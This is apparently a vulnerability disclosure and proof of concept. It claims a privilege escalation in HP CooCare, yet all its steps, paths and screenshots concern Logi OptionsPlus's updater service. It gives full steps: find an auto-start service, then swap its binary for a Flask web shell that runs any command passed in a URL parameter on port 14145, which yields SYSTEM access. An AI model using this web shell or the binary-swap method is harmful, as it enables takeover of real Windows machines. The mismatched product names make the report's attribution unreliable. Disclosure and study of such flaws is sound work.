# HP CooCare An elevation of privilege vulnerability exists 

An elevation of privilege vulnerability exists in HP CooCare which could allow an attacker to elevate their privilege level

test on windows 11 22621.819   HP LAPTOP 

#Vulnerability reproduction

#The first step：wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ 
find the 

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic1.png)



#Step 2：Prepare a malicious program

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic2.png)

    from flask import Flask, request
    import os

    app = Flask(__name__)

    @app.route('/')
    def hello_world():
        r = request.args.getlist('cmd')  #Reception? cmd= parameter
        a=os.popen(r[0])  #Execute system commands
        l = a.read()
        return l  #return

    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=14145, debug=True)  #Listen HTTP port 14145



I was useing python3 flask write a malicious exe .It can listenHTTP port 14145 and execute system commands.

Using commands pyinstaller.exe --onefile --windowed -F -w python_test.py make a malicious exe.



#Step 3：Put malware into Logi OptionsPlus installation path,and rename malware to logioptionsplus_updater.exe.

for me Logi OptionsPlus installation path is :C:\Program Files\LogiOptionsPlus

1.Delete the old logioptionsplus_updater.exe or anything to make logioptionsplus_updater.exe disappear

2.Put malware into Logi OptionsPlus installation path,and rename malware to logioptionsplus_updater.exe

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic3.png)



#Step 4：Start the OptionsPlusUpdaterService

If OptionsPlusUpdaterService is already start you can restart it

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic4.png)



#Step 5：Wait OptionsPlusUpdaterService start and execute the system commands

When I see OptionsPlusUpdaterService start in Taskmgr.exe whit SYSTEM, Then I can Open browser input http://127.0.0.1:14145?cmd=whoami

Wait..........

for...

it.

NT SYSTEM

![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic5.jpg)
